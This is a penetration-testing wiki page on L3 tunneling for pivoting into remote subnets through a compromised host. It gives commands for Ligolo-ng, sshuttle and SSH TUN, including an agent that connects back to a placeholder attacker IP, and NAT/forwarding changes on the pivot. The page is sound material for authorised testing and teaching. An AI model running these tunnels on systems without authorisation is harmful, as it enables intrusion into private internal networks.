---
authors: Macbucheron1
category: infra
---

# L3 Tunneling

## Theory

L3 tunneling is a pivoting technique that provides access to one or more remote networks through a controlled host, with an operator experience similar to a VPN (i.e., tools can be used against remote subnets without being proxy-aware).

Unlike [SOCKS proxying](socks-proxy.md), which requires proxy-aware tools (e.g., `proxychains`), or [port forwarding](port-forwarding.md), which is limited to specific port-to-port mappings, VPN-like approaches transparently carry traffic to selected target prefixes. This enables the use of standard tooling (scanners, exploit frameworks, clients) with minimal to no adaptation.

Several tools can provide this operator experience, but they rely on different mechanisms. As a result, protocol coverage (TCP/UDP/ICMP), DNS handling, and required privileges can vary significantly.

## Practice


:::tabs

== Ligolo-ng
> [!INFO]
> [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) deploys an agent on the compromised host that establishes a reverse connection to the attacker proxy. A TUN interface is created on the attacker host, and traffic is routed through the agent’s encrypted tunnel. TCP and UDP are supported. ICMP echo requests are also supported.

> [!TIP] Prerequisites
> - Root privileges are required to create a `tun` interface on the attacker host.

1. Start the proxy (attacker side)
```bash
sudo ligolo-proxy -selfcert
```
2. Start the agent (pivot side)
```bash
ligolo-agent -accept-fingerprint "$CERTIFICATE_FINGERPRINT" -connect "$ATTACKER_IP:$PROXY_PORT"
```
3. After the agent has joined, select the session with `session` in the proxy CLI.
4. In the proxy CLI, run `autoroute` to select the desired subnet, create the interface, add the route, and start the tunnel.


== Sshuttle
> [!WARNING]
> Client-side support is Unix-like only. 

> [!INFO]
> [Sshuttle](https://github.com/sshuttle/sshuttle) redirects traffic for the selected subnets and forwards it over SSH to a remote Python helper. It is proxy-based (not packet-based): TCP is supported; UDP is supported on Linux only (tproxy method); ICMP is not supported.

> [!TIP] Prerequisites on the attacker side
> - Python 3.9 or greater
> - Depending on the method: iptables or nftables

> [!TIP] Prerequisites on the pivot side
> - Valid SSH credentials are required 
> - Python 3.9 or greater

```shell
sshuttle -r $USER@$TARGET "$SUBNET/$MASK"
```

== SSH
> [!INFO]
> SSH can provide a VPN-like experience by creating a **point-to-point TUN** interface on both endpoints (`ssh -w`). Packets routed to that interface are carried inside the SSH connection and injected on the remote TUN interface.

> [!TIP] Prerequisites on the attacker side
> - Root privileges are required to create and configure a `tun` interface and add routes
> - The system must provide access to `/dev/net/tun`.

> [!TIP] Prerequisites on the pivot side
> - Valid SSH credentials are required.
> - `sshd` must authorize tunneling with `PermitTunnel=1` in `/etc/ssh/sshd_config`.
> - The system must provide access to `/dev/net/tun`.

1. Establish the SSH VPN tunnel (attacker side)
```shell
ssh $USER@$TARGET -w any:any
```
2. Assign tunnel IPs (attacker side)
```shell
ip addr add $TUN_OPERATOR_IP/32 peer $TUN_PIVOT_IP dev tun0
ip link set tun0 up
```
3. Assign tunnel IPs (pivot side)
```shell
ip addr add $TUN_PIVOT_IP/32 peer $TUN_OPERATOR_IP dev tun0
ip link set tun0 up
```
4. Enable forwarding and route the traffic to the target subnet (pivot side)
```shell
sudo sysctl -w net.ipv4.ip_forward=1
iptables -t nat -A POSTROUTING -s $TUN_OPERATOR_IP -o $INTERFACE -j MASQUERADE
```
5. Route the target subnet through the tunnel (attacker side)
```shell
sudo ip route add $SUBNET/$MASK via $TUN_PIVOT_IP dev tun0
```

:::

## Resources

* [Ligolo-ng detailed functionality (AI generated)](https://readmex.com/en-US/nicocha30/ligolo-ng/page-1fd150275-090f-4802-9975-bd87e806a09b)
* [Ligolo-ng Documentation](https://docs.ligolo.ng/)
* [Sshuttle GitHub repository](https://github.com/sshuttle/sshuttle)
* [SSH man page](https://man.openbsd.org/ssh)

